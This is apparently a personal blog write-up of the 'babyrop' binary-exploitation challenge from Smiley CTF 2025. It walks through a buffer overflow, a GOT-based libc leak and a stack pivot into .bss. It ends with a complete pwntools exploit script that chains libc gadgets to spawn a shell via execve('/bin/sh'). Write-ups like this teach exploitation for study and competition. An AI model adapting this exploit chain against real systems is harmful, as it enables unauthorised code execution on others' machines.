---
title: Smiley CTF - `babyrop` Challenge Writeup
summaary: My writeup for the `babyrop` challenge from Smiley CTF 2025.
description: My writeup for the `babyrop` challenge from Smiley CTF 2025.
tags: [ctf, writeup]
categories: [rop, stack pivot]
date: 2025-06-16
draft: false
---
# Smiley CTF - `babyrop` Writeup
## 0x00 - Overview
`Checksec` on given binary:
```
➜  babyrop checksec vuln                           
[*] '/home/delete/CTFs/SmileyCTF/babyrop/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
This challenge is mixture of ROP, Stack Pivot and libc leak.<br>
## 0x01 - Initial Analysis
Now I will try to explain how to solve this challenge step by step.
We have given buffer space of `0x20` bytes and there is buffer overflow vulnerability. We can use this to overwrite the variables. Hmm.. seems simple, right? But wait, there is a catch. We don't have proper gadgets in given binary. So we have to use `libc` gadgets to solve this challenge. To use them we need to libc address. We can do it by leaking puts address through GOT table. After that we can calculate libc base address and then we can use `libc` gadgets to solve this challenge.<br>
On my first attempt I managed to leak libc address but due to `leave; ret` instruction, there is no valid data present at my rbp. Value of rbp is `0x0` and it is not valid address it will cause segmentation fault. So I have to use `stack pivot` technique to solve this challenge.<br>
My Intial Script:
```python
from pwn import *

elf =  context.binary = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
gs = '''
'''
p = process()
gdb.attach(p,gdbscript=gs)
payload = b'A'*8*4
payload += p64(0x000000404010+0x20) # rbp to puts@got + 0x20 
payload += p64(0x0000000000401211) # rip to puts
payload += p64(0x4011cf) # main address
p.sendline(payload)
p.recvline()
s = p.recvall(timeout=1)
s = s[:-1]
addr = int.from_bytes(s, 'little')
log.info(f'libc Leak: {hex(addr)}')
libc.address = addr - libc.sym['puts']
log.info(f'libc base: {hex(libc.address)}')
p.interactive()

```
Why I used `0x000000404010+0x20` as rbp? Because we have `0x20` bytes buffer space.
```
  => 0x0000000000401211 <+66>:	mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 <print>
     0x0000000000401218 <+73>:	lea    rax,[rbp-0x20]
     0x000000000040121c <+77>:	mov    rdi,rax
     0x000000000040121f <+80>:	call   rdx
     0x0000000000401221 <+82>:	mov    eax,0x0
     0x0000000000401226 <+87>:	leave
     0x0000000000401227 <+88>:	ret

```
We can see that `print` function is called with `rbp-0x20` as argument. So we have to set rbp to `0x000000404010+0x20` to make it work.<br>
Now we can leak `puts` address and calculate `libc` base address. After that we can use `libc` gadgets to solve this challenge.<br>
Since there is no valid data at rbp, we are expected to see this in gdb:
```Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────
*RAX  0
 RBX  0x7fff651e32e8 —▸ 0x7fff651e5195 ◂— '/home/delete/CTFs/SmileyCTF/babyrop/vuln_patched'
*RCX  0x70b17c71c574 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0
*RDI  0x70b17c805710 (_IO_stdfile_1_lock) ◂— 0
*RSI  0x70b17c804643 (_IO_2_1_stdout_+131) ◂— 0x805710000000000a /* '\n' */
*R8   6
 R9   0x70b17ca0a380 (_dl_fini) ◂— endbr64 
 R10  0x7fff651e2ee0 ◂— 0x800000
*R11  0x202
 R12  1
 R13  0
 R14  0x403dc8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401140 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x70b17ca3d000 (_rtld_global) —▸ 0x70b17ca3e2e0 ◂— 0
*RBP  0
*RSP  0x404040 ◂— 0
*RIP  0
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x0










──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x404040 ◂— 0
... ↓        7 skipped
────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0              0x0 None
   1              0x0 None
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
We can see `rip` is `0x0` and `rbp` is `0x0`. So we can use `stack pivot` technique to solve this challenge.<br>

## 0x02 - Exploit
Now we have basic idea of how to solve this challenge. Let's start abusing this challenge.
```python
payload = flat({
    0x20:0x404038 + 0x20,  #Setting this as RBP
    0x28:0x0000000000401205,  # RIP --> gets of main
})
```
This is our first payload. We are setting `rbp` to `0x404038 + 0x20` and `rip` to `0x0000000000401205` which is `gets` address in main function. After this we can use `gets` to read our next payload.<br>
What it does?<br>
It simply calls `gets(0x404038)` to take our input <br>
Why calling `gets`? <br>
To overcome the issue we are facing with `leave; ret` instruction. We can use `gets` to write some valid address at `rbp` so that when `leave; ret` is executed, it will not cause segmentation fault.<br>
```python
payload = flat({
    0: [
        pop_rbp,  # pop rbp
        0x0000000000404150,  # points to main address in .bss
        leave_ret   # leave ; ret
    ],
    0x20: elf.sym.print + 0x20,  # RBP --> @puts+0x20
    0x28: [
        0x401227, # increasing the stack space
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x0000000000401211,
        elf.sym.main] # This is the value at address 0x0000000000404150
})
```
This is our second payload. We are setting `rbp` to `puts+0x20` and `rip` to `0x0000000000401211` which is `puts` address in main function. After this we can leak the `puts` address and calculate the `libc` base address.<br>
Answering Some Questions:<br>
1. What is the need to increase to stack by padding `ret ` instruction?<br>
    If you directly invoke functions like `puts()`, the program may crash because `puts()` and similar functions make several nested calls, each creating its own stack frame (typically via `sub rsp, ...`). In this challenge, the stack is pivoted into the `.bss` section, which is writable, but if the stack pointer (`rsp`) moves into a non-writable region (like `0x403000`), any further stack operations will cause a segmentation fault.

    To prevent this, we use a sequence of dummy instructions (such as repeated `ret` or `pop` gadgets) to incrementally move the stack pointer deeper into the writable `.bss` section. This ensures that all subsequent function calls have enough writable stack space for their frames, avoiding stack underflows into non-writable memory and preventing crashes.
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/delete/CTFs/SmileyCTF/babyrop/vuln
          0x401000           0x402000 r-xp     1000   1000 /home/delete/CTFs/SmileyCTF/babyrop/vuln
          0x402000           0x403000 r--p     1000   2000 /home/delete/CTFs/SmileyCTF/babyrop/vuln
          0x403000           0x404000 r--p     1000   2000 /home/delete/CTFs/SmileyCTF/babyrop/vuln
          0x404000           0x405000 rw-p     1000   3000 /home/delete/CTFs/SmileyCTF/babyrop/vuln
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7db0000 r-xp   188000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db0000     0x7ffff7dff000 r--p    4f000 1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dff000     0x7ffff7e03000 r--p     4000 1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e03000     0x7ffff7e05000 rw-p     2000 202000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e05000     0x7ffff7e12000 rw-p     d000      0 [anon_7ffff7e05]
    0x7ffff7f9e000     0x7ffff7fa1000 rw-p     3000      0 [anon_7ffff7f9e]
    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000      0 [anon_7ffff7fbd]
    0x7ffff7fbf000     0x7ffff7fc3000 r--p     4000      0 [vvar]
    0x7ffff7fc3000     0x7ffff7fc5000 r-xp     2000      0 [vdso]
    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc6000     0x7ffff7ff1000 r-xp    2b000   1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```
2. Why `0x0000000000404150` is used as `rbp`?<br>
    We are setting the value at `0x0000000000404150` to the address of `main` function in `.bss` section. 
    You ask why? Because when we counter `leave; ret` instruction, in out payload-1 first it changes to our `rbp` to `0x404058` and next we are using gets function to our next payload.<br>
    You can see register values in gdb:
    ```
     RBP  0x404058 ◂— 0
     RSP  0x7ffd17b46090 —▸ 0x7ffd17b46000 —▸ 0x7ffd17b46050 —▸ 0x7ffd17b46080 —▸ 0x404058 ◂— ...
    *RIP  0x40120c (main+61) ◂— call gets
    ```
    Here comes the best part in this challenge, when we call `gets` function, it will read the input and write it to `0x404058` which is our `rbp`. So when `leave; ret` instruction is executed, it will not cause segmentation fault because now `rbp` has valid address.<br>
    So now register values will be:
    ```
     RBP  0x404058 —▸ 0x404030 ◂— 0
     RSP  0x7ffd17b46090 —▸ 0x7ffd17b46000 —▸ 0x7ffd17b46050 —▸ 0x7ffd17b46080 —▸ 0x404058 ◂— ...
    *RIP  0x40121f (main+80) ◂— call rdx
    ```
    Now when program executes `leave; ret` instruction, our new `rsp` changes to `0x404030`. Remember what we kept at `0x404030`? We kept out small rop chain of `pop rbp; 0x0000000000404150; leave; ret`.<br>
    This changes our rsp to `main` and we can perform our exploit.
    Since our puts address has already been leaked, we can calculate the `libc` base address and use it to solve this challenge.<br>

This is our ROP chain:
```python
rop = ROP(libc)
rop.rdi = next(libc.search(b'/bin/sh\x00'))
rop.rsi = 0
rop.rbp = 0x404198
rop.raw(libc.address + 0x00000000000981ad) # pop rdx ; leave ; ret
rop.raw(0)
rop.execve()
```

Now we can send our final payload:
```python
p.sendline(flat({
    0x28: rop.chain()
}))
```
We used `0x28` offset because our RIP lies here. Remember, our buffer is `0x20` bytes and saved rbp is `0x8` bytes. So our RIP lies at `0x28` offset.<br>

## 0x03 - Final Script
```python
from pwn import *

elf =  context.binary = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
gs = '''
'''
# ========= Gadgets =========
pop_rbp = 0x401181
leave_ret = 0x401226
pop_rcx = 0x40117e
ret = 0x401227

p = process()
# gdb.attach(p, gdbscript=gs)

payload = flat({
    0x20:0x404038 + 0x20,  #Setting this as RBP
    0x28:0x0000000000401205,  # RIP --> gets of main
}, filler=b'\x00')

log.info(f'Sent payload: {payload}')
p.sendline(payload)
input("Press Enter to continue...")
payload = flat({
    0: [
        pop_rbp,  # pop rbp
        0x0000000000404150,  # points to main address in .bss
        leave_ret   # leave ; ret
    ],
    0x20: elf.sym.print + 0x20,  # RBP --> @puts+0x20
    0x28: [
        0x401227, # increasing the stack space
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x401227,
        0x0000000000401211,
        elf.sym.main] # This is the value at address 0x0000000000404150
})
log.info(f'Sending payload: {payload}')
log.info(f'length: {len(payload)} bytes')
log.info(f'RBP({hex(0x404038) }) + LEN({hex(len(payload)-16)}) = {hex(0x404038 + len(payload)-16)} Main address in .bss: {hex(0x404150)}')
p.sendline(payload)

p.recvline()
p.recvline()
# p.recvline()
libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.puts
log.success(f'{hex(libc.address) = }')

rop = ROP(libc)
rop.rdi = next(libc.search(b'/bin/sh\x00'))
rop.rsi = 0
rop.rbp = 0x404198
rop.raw(libc.address + 0x00000000000981ad) # pop rdx ; leave ; ret
rop.raw(0)
rop.execve()

print(rop.dump())

p.sendline(flat({
    0x28: rop.chain()
}))

p.interactive()
```
## 0x04 - Conclusion
This challenge was a great mixture of ROP, Stack Pivot and libc leak. It taught me how to use `libc` gadgets to solve the challenges when there are no proper gadgets in given binary. I hope this writeup helps you to understand the challenge better.<br>
Special thanks to `VulnX` for helping me with this challenge and guiding me through the process. If you have any questions or suggestions, feel free to reach out to me.<br>
Make sure to check out VulnX's Writeup page for more awesome writeups: [VulnX Writeup]([text](https://vulnx.github.io/))<br>
